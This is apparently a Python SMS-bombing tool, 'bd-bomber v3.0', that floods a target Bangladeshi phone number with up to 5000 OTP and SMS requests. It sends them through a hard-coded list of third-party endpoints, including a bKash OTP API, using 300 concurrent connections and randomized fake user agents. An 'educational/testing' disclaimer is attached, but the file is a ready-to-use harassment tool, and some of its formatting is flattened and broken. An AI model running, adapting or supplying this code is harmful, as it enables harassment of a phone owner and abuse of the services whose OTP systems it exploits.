#!/usr/bin/env python3

-- coding: utf-8 --

""" bd-bomber v3.0 - Super-Fast Multi-Threaded SMS Bombing Framework Developed for educational and testing purposes only. Author: Joy Roy (ElectricSoul) GitHub: https://github.com/joyroydev """

import os import sys import asyncio import aiohttp import random import time from datetime import datetime from colorama import Fore, Style, init

init(autoreset=True)

============== CONFIGURATION ==============

VERSION = "3.0" AUTHOR = "Joy Roy (ElectricSoul)" API_LIST = [ "https://bomberdemofor2hrtcs.vercel.app/api/trialapi?phone={phone}", "https://api.task10.top/call.php?number={phone}", "https://mohammadahad.com/nagadbomber.php?num={phone}", "https://cpp.bka.sh/external-services/referral/report/otp/request", # Add more API endpoints below ] * 50  # Replicate list to simulate 1000+ requests

FAKE_USER_AGENTS = [ "Mozilla/5.0 (Linux; Android 10; SM-G975F)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" ] MAX_RETRIES = 3 CONCURRENT_LIMIT = 300

============== UTILITIES ==============

def clear(): os.system("cls" if os.name == "nt" else "clear")

def banner(): clear() print(Fore.CYAN + Style.BRIGHT + f""" ╔══════════════════════════════════════════════════╗ ║                BD BOMBER v{VERSION} - SUPER FAST             ║ ╠══════════════════════════════════════════════════╣ ║ Author : {AUTHOR}
║ GitHub : github.com/joyroydev
║ Legal  : For educational/testing use only
╚══════════════════════════════════════════════════╝ """)

def get_random_ua(): return random.choice(FAKE_USER_AGENTS)

def log(index, msg, status="info"): colors = {"info": Fore.CYAN, "success": Fore.GREEN, "error": Fore.RED, "warn": Fore.YELLOW} color = colors.get(status, Fore.WHITE) print(color + f"[{index}] {msg}")

============== CORE BOMBER LOGIC ==============

async def send_api_request(session, phone, index): retries = 0 api_template = random.choice(API_LIST) while retries <= MAX_RETRIES: try: headers = {"User-Agent": get_random_ua()}

# Special handling for bKash POST API
        if "bka.sh" in api_template:
            json_data = {"referrerWallet": phone}
            async with session.post(api_template, json=json_data, headers=headers) as resp:
                if resp.status == 200:
                    log(index, f"bKash API ✅ ({resp.status})", "success")
                else:
                    log(index, f"bKash API Error: {resp.status}", "error")
            return

        else:
            url = api_template.format(phone=phone)
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        if data.get("status") == "success":
                            log(index, f"Success ✅ ({resp.status})", "success")
                            return
                        else:
                            log(index, "API did not confirm success", "warn")
                            return
                    except:
                        log(index, "Non-JSON success", "success")
                        return
                else:
                    log(index, f"HTTP Error: {resp.status}", "error")
    except Exception as e:
        retries += 1
        log(index, f"Retry {retries} - Error: {e}", "error")
        await asyncio.sleep(0.3)

============== CONTROLLER ==============

async def start_bombing(phone, total): banner() print(Fore.YELLOW + f"[+] Target: {phone}") print(Fore.YELLOW + f"[+] Sending {total} requests using {CONCURRENT_LIMIT} concurrent threads\n") await asyncio.sleep(1)

connector = aiohttp.TCPConnector(limit=CONCURRENT_LIMIT)
async with aiohttp.ClientSession(connector=connector) as session:
    tasks = [send_api_request(session, phone, i) for i in range(1, total + 1)]
    await asyncio.gather(*tasks)

============== ENTRY POINT ==============

def main(): try: banner() phone = input(Fore.CYAN + "Enter target number (e.g. 017XXXXXXXX): ").strip() if not phone.startswith("01") or len(phone) < 10: print(Fore.RED + "Invalid phone number format!") sys.exit(1)

total = int(input(Fore.CYAN + "How many messages to send (1–5000): "))
    if total < 1 or total > 5000:
        print(Fore.RED + "Invalid amount. Must be 1 to 5000.")
        sys.exit(1)

    print(Fore.MAGENTA + "\n[~] Bombing started. Please wait...\n")
    asyncio.run(start_bombing(phone, total))

    print(Fore.GREEN + "\n[✓] Bombing session finished at",
          datetime.now().strftime("%H:%M:%S"))

except KeyboardInterrupt:
    print(Fore.RED + "\n[!] Interrupted by user.")
    sys.exit(0)

============== LAUNCH ==============

if name == "main": main()


